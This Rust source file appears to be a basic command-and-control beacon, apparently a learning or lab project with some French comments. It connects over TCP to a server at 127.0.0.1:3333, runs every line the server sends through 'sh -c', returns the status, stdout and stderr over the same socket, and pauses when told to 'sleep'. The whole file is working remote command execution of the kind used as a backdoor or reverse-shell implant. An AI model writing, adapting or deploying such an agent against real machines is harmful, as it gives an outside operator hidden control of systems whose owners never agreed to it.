use std::process::Command;
use std::net::TcpStream;
use std::io::BufReader;
use std::io::BufRead;
use std::io::BufWriter;
use std::io::Write;
use std::net::SocketAddr;
use std::{thread, time};

//use std::os::unix::net::SocketAddr;



struct Resultat{
    status: String,
    stdout: String,
    stderr: String,
}

fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
    Resultat {
        status,
        stdout,
        stderr,
    }
}

/* execute commands and returns results */
fn execute_commands(command: &str) -> Resultat {
    
    //  runs the program and returns the output
    let output = Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .output()
                    .expect("failed to execute process");
    let s = output.status.to_string();
    let o = String::from_utf8_lossy(&output.stdout).to_string();
    let e = String::from_utf8_lossy(&output.stderr).to_string();   
    let results = create_resultat(s, o, e);
    results
}


/* display the array result */
fn display_resultat(v: Vec<Resultat>){
    if v.is_empty(){
        println!("Il n'y a pas de resultat ");
    }else{
        for i in &v {
            println!("status: {}", i.status);
            println!("stdout: {}", i.stdout);
            println!("stderr: {}", i.stderr);
        }
    }

}


fn get_command(command: &str) -> String{
    let mut result = command.replace("command  ", "");
    let result = result.replace(" target", "");
    result
}


fn sleep_beacon(milli_second: u64){
    let ten_millis = time::Duration::from_millis(milli_second);
    let now = time::Instant::now();
    thread::sleep(ten_millis);
}


fn main(){
    /*
    let mut list_result_command:Vec<Resultat> = Vec::new();
    let tab = ["ls","ps","touch", ""]; // rajouter string::from
    for i in 0..tab.len(){
        if tab[i] != ""{
            let results = execute_commands(tab[i]);
            list_result_command.push(results);
        }else{
            list_result_command.push(create_resultat("null".to_string(),"null".to_string(),"String is empty".to_string()));
        }
    }
    display_resultat(list_result_command);
    */

    // connect to the server
    /*
    if let Ok(TcpStream) = TcpStream::connect("127.0.0.1:3333"){
        println!("Connecting to the server!");
    }else{
        println!("Failed to connect to the server!");
    }
    */
   
    //let mut list_result_command:Vec<Resultat> = Vec::new();

    let addr = "127.0.0.1:3333";
    let mut stream = TcpStream::connect(addr).unwrap();
    println!("Server connecting on addr {}",addr);
    let mut reader = BufReader::new(&stream);
    let mut writer = &stream;
    let mut line = String::new();
    let lines_server = reader.lines().fuse();
    for l in lines_server {
        line = l.unwrap();
        if line.contains("command") | line.contains("target"){

        }
        if line.contains("sleep"){
            println!("exectue sleep function");
            sleep_beacon(10000);
        }else{ 
            /*line.contains("command") | line.contains("target") {*/
            let mut response = String::from("response:");
            let command = get_command(line.trim()); // return the command input without "command" and "target"
            println!("command receive is : {}", command);
            let results = execute_commands(&command);
            println!("result of the command : {}", results.stdout);
            response.push_str(&results.status);
            response.push_str(" stdout : ");
            response.push_str(&results.stdout);
            response.push_str(" stderr : ");
            response.push_str(&results.stderr);
            println!("{}", response);
            writer.write_all(response.as_bytes()).unwrap();
            //list_result_command.push(results);
        }
    }
    //reader.read_line(&mut line);
    //println!("{}",line);
    

}

